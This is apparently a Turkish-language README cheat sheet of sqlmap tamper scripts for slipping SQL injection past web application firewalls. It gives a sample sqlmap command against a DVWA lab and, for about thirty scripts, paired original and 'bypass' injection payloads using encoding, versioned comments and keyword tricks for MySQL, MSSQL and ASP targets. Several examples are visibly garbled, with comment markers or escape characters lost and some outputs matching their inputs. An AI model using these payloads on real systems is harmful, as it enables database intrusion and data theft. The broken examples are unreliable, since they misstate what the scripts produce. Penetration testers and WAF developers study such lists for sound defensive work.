# SQLMapWafBypass
SQLmap Waf Bypass İçin Tamper Listesi


Örnek Kullanımı; sqlmap -u "http://1.2.3.4/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --tamper "randomcase" --dbs

apostrophemask.py (UTF-8) Örnek:

Orijinal Komut: AND '1'='1'
Bypass Komutu: AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87
apostrophenullencode.py (unicode) Örnek:

Orijinal Komut: AND '1'='1'
Bypass Komutu: AND %271%27=%271%27
appendnullbyte.py () Örnek:

Orijinal Komut: AND 1=1
Bypass Komutu: AND 1=1 Platform:
Microsoft Access
base64encode.py (base64) Örnek:

Orijinal Komut: 1' AND SLEEP(5)#
Bypass Komutu: MScgQU5EIFNMRUVQKDUpIw==
between.py (“not between” “>”) Örnek:

Orijinal Komut: 'A > B'
Bypass Komutu: 'A NOT BETWEEN 0 AND B'
bluecoat.py (“like” “=”) Örnek:

Orijinal Komut: SELECT id FROM users where id = 1
Bypass Komutu: SELECT%09id FROM users where id LIKE 1 Platform:
MySQL 5.1, SGOS
chardoubleencode.py Örnek:

Orijinal Komut: SELECT FIELD FROM%20TABLE
Bypass Komutu: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545
charencode.py Örnek:

Orijinal Komut: SELECT FIELD FROM%20TABLE
Bypass Komutu: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
charunicodeencode.py Örnek:

Orijinal Komut: SELECT FIELD%20FROM TABLE
Bypass Komutu: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045' Platform:
ASP
ASP.NET
equaltolike.py (“like” “=”) Örnek:

Orijinal Komut: SELECT * FROM users WHERE id=1
Bypass Komutu: SELECT * FROM users WHERE id LIKE 1
halfversionedmorekeywords.py Örnek:

Orijinal Komut: value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa
Bypass Komutu: value'/!0UNION/!0ALL/!0SELECT/!0CONCAT(/!0CHAR(58,107,112,113,58),/!0IFNULL(CAST(/!0CURRENT_USER()/!0AS/!0CHAR),/!0CHAR(32)),/!0CHAR(58,97,110,121,58)), NULL, NULL#/!0AND 'QDWa'='QDWa Platform:
MySQL < 5.1
ifnull2ifisnull.py (“IF(ISNULL(A), B, A)” “IFNULL(A, B)”) Örnek:

Orijinal Komut: IFNULL(1, 2)
Bypass Komutu: IF(ISNULL(1), 2, 1) Platform:
MySQL
SQLite (possibly)
SAP MaxDB (possibly)
modsecurityversioned.py Örnek:

Orijinal Komut: 1 AND 2>1--
Bypass Komutu: 1 /!30000AND 2>1/-- Platform:
MySQL
modsecurityzeroversioned.py (“0000”) Örnek:

Orijinal Komut: 1 AND 2>1--
Bypass Komutu: 1 /!00000AND 2>1/-- Platform:
MySQL
multiplespaces.py Örnek:

Orijinal Komut: UNION SELECT
Bypass Komutu: UNION SELECT
nonrecursivereplacement.py Örnek:

Orijinal Komut: 1 UNION SELECT 2--
Bypass Komutu: 1 UNUNIONION SELSELECTECT 2--
percentage.py (“%”) Örnek:

Orijinal Komut: SELECT FIELD FROM TABLE
Bypass Komutu: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E Platform:
ASP
randomcase.py Örnek:

Orijinal Komut: INSERT
Bypass Komutu: InsERt
randomcomments.py Örnek: 'INSERT' becomes 'IN//S//ERT'

securesphere.py Örnek:

Orijinal Komut: AND 1=1
Bypass Komutu: AND 1=1 and '0having'='0having'
sp_password.py (“sp_password”) Örnek:

Orijinal Komut: 1 AND 9227=9227--
Bypass Komutu: 1 AND 9227=9227--sp_password Platform:
MSSQL
space2comment.py Örnek:

Orijinal Komut: SELECT id FROM users
Bypass Komutu: SELECT//id//FROM/**/users
space2dash.py (“--”) Örnek:

Orijinal Komut: 1 AND 9227=9227
Bypass Komutu: 1--PTTmJopxdWJ%0AAND--cWfcVRPV%0A9227=9227 Platform:
MSSQL
SQLite
space2hash.py Örnek:

Orijinal Komut: 1 AND 9227=9227
Bypass Komutu: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 Platform:
MySQL
space2morehash.py Platform:

MySQL >= 5.1.13
space2mssqlblank.py Örnek:

Orijinal Komut: SELECT id FROM users
Bypass Komutu: SELECT%08id%02FROM%0Fusers Platform:
Microsoft SQL Server
space2mssqlhash.py Örnek:

Orijinal Komut: 1 AND 9227=9227
Bypass Komutu: 1%23%0A9227=9227 Platform:
MSSQL
MySQL
space2mysqlblank.py Örnek:

Orijinal Komut: SELECT id FROM users
Bypass Komutu: SELECT%0Bid%0BFROM%A0users Platform:
MySQL
space2mysqldash.py Örnek:

Orijinal Komut: 1 AND 9227=9227
Bypass Komutu: 1--%0AAND--%0A9227=9227 Platform:
MySQL
MSSQL
space2plus.py (“+”) Örnek:

Orijinal Komut: SELECT id FROM users
Bypass Komutu: SELECT+id+FROM+users
space2randomblank.py Örnek:

Orijinal Komut: SELECT id FROM users
Bypass Komutu: SELECTridtFROMnusers
unionalltounion.py (“union all” “union”) Örnek:

Orijinal Komut: -1 UNION ALL SELECT
Bypass Komutu: -1 UNION SELECT
unmagicquotes.py (“%bf%27” “--”) Örnek:

Orijinal Komut: 1' AND 1=1
Bypass Komutu: 1%bf%27 AND 1=1--%20
versionedkeywords.py Örnek:

Orijinal Komut: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#
Bypass Komutu: 1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/!AS//!CHAR/),CHAR(32)),CHAR(58,100,114,117,58))# Platform:
MySQL
versionedmorekeywords.py Örnek:

Orijinal Komut: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#
Bypass Komutu: 1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/,/!CONCAT/(/!CHAR/(58,122,114,115,58),/!IFNULL/(CAST(/!CURRENT_USER/()/!AS//!CHAR/),/!CHAR/(32)),/!CHAR/(58,115,114,121,58))# Platform:
MySQL >= 5.1.13
